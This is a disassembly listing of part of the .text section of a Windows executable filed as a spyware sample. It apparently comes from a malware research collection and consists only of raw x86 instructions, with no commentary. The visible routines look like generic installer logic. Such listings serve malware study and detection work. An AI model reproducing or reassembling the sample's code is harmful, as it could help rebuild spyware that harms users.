
malware_samples/spyware/b04768efe09a940c12c4ad29b5296febace8aa3d494778f8277d1378b028821b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d e8 4e 43 00    	mov    0x434ee8,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 1c 82 40 00    	call   *0x40821c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 f4 4e 43 00    	mov    0x434ef4,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 20 82 40 00    	call   *0x408220
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 24 82 40 00    	call   *0x408224
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 60 80 40 00    	mov    0x408060,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 5c 80 40 00    	call   *0x40805c
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 28 82 40 00    	call   *0x408228
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 58 80 40 00    	call   *0x408058
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 54 80 40 00    	call   *0x408054
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 50 80 40 00    	call   *0x408050
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 4c 80 40 00    	mov    0x40804c,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 e0 3e 43 00       	push   $0x433ee0
  401155:	57                   	push   %edi
  401156:	ff 15 80 82 40 00    	call   *0x408280
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 84 82 40 00    	call   *0x408284
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 28 4f 43 00       	mov    0x434f28,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 2c 4f 43 00    	cmp    0x434f2c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 2c 4f 43 00    	cmp    0x434f2c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 28 4f 43 00    	mov    0x434f28,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 2c 4f 43 00    	cmp    0x434f2c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 2c 4f 43 00    	cmp    0x434f2c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 28 4f 43 00       	mov    0x434f28,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 2c 4f 43 00    	cmp    %esi,0x434f2c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 2c 4f 43 00    	cmp    0x434f2c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 f4 4e 43 00       	mov    0x434ef4,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 2c 4f 43 00    	mov    0x434f2c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 28 4f 43 00    	mov    0x434f28,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 43 00       	mov    $0x435000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 09 4f 00 00       	call   0x40628f
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 30 4f 43 00    	mov    0x434f30,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 cc 3e 43 00    	add    %eax,0x433ecc
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 b4 3e 43 00    	push   0x433eb4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 cc 3e 43 00    	push   0x433ecc
  4013e4:	ff 15 50 81 40 00    	call   *0x408150
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 18 82 40 00    	call   *0x408218
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d f4 4e 43 00    	mov    0x434ef4,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 d0 ad 40 00       	push   $0x40add0
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 66 3f 00 00       	call   0x405397
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 e8 4e 43 00       	mov    0x434ee8,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	bf 00 50 43 00       	mov    $0x435000,%edi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 cf                	add    %edi,%ecx
  401468:	8b f0                	mov    %eax,%esi
  40146a:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e6 0b             	shl    $0xb,%esi
  401473:	89 0d 2c ce 40 00    	mov    %ecx,0x40ce2c
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 f7                	add    %edi,%esi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 a8 16 00 00    	ja     0x402b32
  40148a:	ff 24 8d 44 2b 40 00 	jmp    *0x402b44(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 ff 3e 00 00       	call   0x405397
  401498:	e9 c7 0e 00 00       	jmp    0x402364
  40149d:	ff 05 ac 3e 43 00    	incl   0x433eac
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 b8 0e 00 00    	je     0x402364
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 60 82 40 00    	call   *0x408260
  4014b3:	e9 ac 0e 00 00       	jmp    0x402364
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 72 16 00 00       	jmp    0x402b3d
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 c5 3e 00 00       	call   0x405397
  4014d2:	e9 5b 16 00 00       	jmp    0x402b32
  4014d7:	53                   	push   %ebx
  4014d8:	e8 af 17 00 00       	call   0x402c8c
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 78 80 40 00    	call   *0x408078
  4014f0:	e9 3d 16 00 00       	jmp    0x402b32
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 90 82 40 00    	call   *0x408290
  4014fe:	e9 2f 16 00 00       	jmp    0x402b32
  401503:	c1 e0 02             	shl    $0x2,%eax
  401506:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401509:	75 26                	jne    0x401531
  40150b:	8b 88 80 4f 43 00    	mov    0x434f80(%eax),%ecx
  401511:	6a 01                	push   $0x1
  401513:	89 88 c0 4f 43 00    	mov    %ecx,0x434fc0(%eax)
  401519:	e8 6e 17 00 00       	call   0x402c8c
  40151e:	59                   	pop    %ecx
  40151f:	89 55 f4             	mov    %edx,-0xc(%ebp)
  401522:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401525:	89 04 8d 80 4f 43 00 	mov    %eax,0x434f80(,%ecx,4)
  40152c:	e9 01 16 00 00       	jmp    0x402b32
  401531:	8b 88 c0 4f 43 00    	mov    0x434fc0(%eax),%ecx
  401537:	89 88 80 4f 43 00    	mov    %ecx,0x434f80(%eax)
  40153d:	e9 f0 15 00 00       	jmp    0x402b32
  401542:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401545:	8d 34 85 80 4f 43 00 	lea    0x434f80(,%eax,4),%esi
  40154c:	33 c0                	xor    %eax,%eax
  40154e:	8b 0e                	mov    (%esi),%ecx
  401550:	3b cb                	cmp    %ebx,%ecx
  401552:	0f 94 c0             	sete   %al
  401555:	23 4d dc             	and    -0x24(%ebp),%ecx
  401558:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  40155c:	89 0e                	mov    %ecx,(%esi)
  40155e:	e9 da 15 00 00       	jmp    0x402b3d
  401563:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401566:	ff 34 85 80 4f 43 00 	push   0x434f80(,%eax,4)
  40156d:	56                   	push   %esi
  40156e:	e9 65 15 00 00       	jmp    0x402ad8
  401573:	8b 0d b0 3e 43 00    	mov    0x433eb0,%ecx
  401579:	8b 35 5c 82 40 00    	mov    0x40825c,%esi
  40157f:	3b cb                	cmp    %ebx,%ecx
  401581:	74 09                	je     0x40158c
  401583:	ff 75 d4             	push   -0x2c(%ebp)
  401586:	51                   	push   %ecx
  401587:	ff d6                	call   *%esi
  401589:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40158c:	8b 0d c4 3e 43 00    	mov    0x433ec4,%ecx
  401592:	3b cb                	cmp    %ebx,%ecx
  401594:	0f 84 98 15 00 00    	je     0x402b32
  40159a:	50                   	push   %eax
  40159b:	51                   	push   %ecx
  40159c:	ff d6                	call   *%esi
  40159e:	e9 8f 15 00 00       	jmp    0x402b32
  4015a3:	6a f0                	push   $0xfffffff0
  4015a5:	e8 04 17 00 00       	call   0x402cae
  4015aa:	ff 75 d4             	push   -0x2c(%ebp)
  4015ad:	50                   	push   %eax
  4015ae:	ff 15 74 80 40 00    	call   *0x408074
  4015b4:	85 c0                	test   %eax,%eax
  4015b6:	0f 85 76 15 00 00    	jne    0x402b32
  4015bc:	e9 37 13 00 00       	jmp    0x4028f8
  4015c1:	6a f0                	push   $0xfffffff0
  4015c3:	e8 e6 16 00 00       	call   0x402cae
  4015c8:	50                   	push   %eax
  4015c9:	89 45 08             	mov    %eax,0x8(%ebp)
  4015cc:	e8 de 46 00 00       	call   0x405caf
  4015d1:	8b f0                	mov    %eax,%esi
  4015d3:	3b f3                	cmp    %ebx,%esi
  4015d5:	74 5a                	je     0x401631
  4015d7:	6a 5c                	push   $0x5c
  4015d9:	56                   	push   %esi
  4015da:	e8 52 46 00 00       	call   0x405c31
  4015df:	8b f0                	mov    %eax,%esi
  4015e1:	66 8b 3e             	mov    (%esi),%di
  4015e4:	66 89 1e             	mov    %bx,(%esi)
  4015e7:	66 3b fb             	cmp    %bx,%di
  4015ea:	75 18                	jne    0x401604
  4015ec:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4015ef:	74 13                	je     0x401604
  4015f1:	e8 0a 43 00 00       	call   0x405900
  4015f6:	85 c0                	test   %eax,%eax
  4015f8:	74 0a                	je     0x401604
  4015fa:	ff 75 08             	push   0x8(%ebp)
  4015fd:	e8 64 42 00 00       	call   0x405866
  401602:	eb 08                	jmp    0x40160c
  401604:	ff 75 08             	push   0x8(%ebp)
  401607:	e8 d7 42 00 00       	call   0x4058e3
  40160c:	3b c3                	cmp    %ebx,%eax
  40160e:	74 17                	je     0x401627
  401610:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401615:	75 0d                	jne    0x401624
  401617:	ff 75 08             	push   0x8(%ebp)
  40161a:	ff 15 94 80 40 00    	call   *0x408094
  401620:	a8 10                	test   $0x10,%al
  401622:	75 03                	jne    0x401627
  401624:	ff 45 fc             	incl   -0x4(%ebp)
  401627:	66 89 3e             	mov    %di,(%esi)
  40162a:	46                   	inc    %esi
  40162b:	46                   	inc    %esi
  40162c:	66 3b fb             	cmp    %bx,%di
  40162f:	75 a6                	jne    0x4015d7
  401631:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401634:	74 2d                	je     0x401663
  401636:	6a e6                	push   $0xffffffe6
  401638:	e8 e6 fd ff ff       	call   0x401423
  40163d:	ff 75 08             	push   0x8(%ebp)
  401640:	68 00 00 44 00       	push   $0x440000
  401645:	e8 e5 4c 00 00       	call   0x40632f
  40164a:	ff 75 08             	push   0x8(%ebp)
  40164d:	ff 15 90 80 40 00    	call   *0x408090
  401653:	85 c0                	test   %eax,%eax
  401655:	0f 85 d7 14 00 00    	jne    0x402b32
  40165b:	ff 45 fc             	incl   -0x4(%ebp)
  40165e:	e9 cf 14 00 00       	jmp    0x402b32
  401663:	6a f5                	push   $0xfffffff5
  401665:	e9 4e 0c 00 00       	jmp    0x4022b8
  40166a:	53                   	push   %ebx
  40166b:	e8 3e 16 00 00       	call   0x402cae
  401670:	50                   	push   %eax
  401671:	e8 fc 4f 00 00       	call   0x406672
  401676:	e9 89 06 00 00       	jmp    0x401d04
  40167b:	6a d0                	push   $0xffffffd0
  40167d:	e8 2c 16 00 00       	call   0x402cae
  401682:	6a df                	push   $0xffffffdf
  401684:	8b f0                	mov    %eax,%esi
  401686:	e8 23 16 00 00       	call   0x402cae
  40168b:	6a 13                	push   $0x13
  40168d:	8b f8                	mov    %eax,%edi
  40168f:	e8 1a 16 00 00       	call   0x402cae
  401694:	57                   	push   %edi
  401695:	56                   	push   %esi
  401696:	ff 15 bc 80 40 00    	call   *0x4080bc
  40169c:	85 c0                	test   %eax,%eax
  40169e:	74 07                	je     0x4016a7
  4016a0:	6a e3                	push   $0xffffffe3
  4016a2:	e9 11 0c 00 00       	jmp    0x4022b8
  4016a7:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4016aa:	0f 84 48 12 00 00    	je     0x4028f8
  4016b0:	56                   	push   %esi
  4016b1:	e8 bc 4f 00 00       	call   0x406672
  4016b6:	85 c0                	test   %eax,%eax
  4016b8:	0f 84 3a 12 00 00    	je     0x4028f8
  4016be:	57                   	push   %edi
  4016bf:	56                   	push   %esi
  4016c0:	e8 30 4a 00 00       	call   0x4060f5
  4016c5:	6a e4                	push   $0xffffffe4
  4016c7:	e9 ec 0b 00 00       	jmp    0x4022b8
  4016cc:	53                   	push   %ebx
  4016cd:	e8 dc 15 00 00       	call   0x402cae
  4016d2:	8b 7d ec             	mov    -0x14(%ebp),%edi
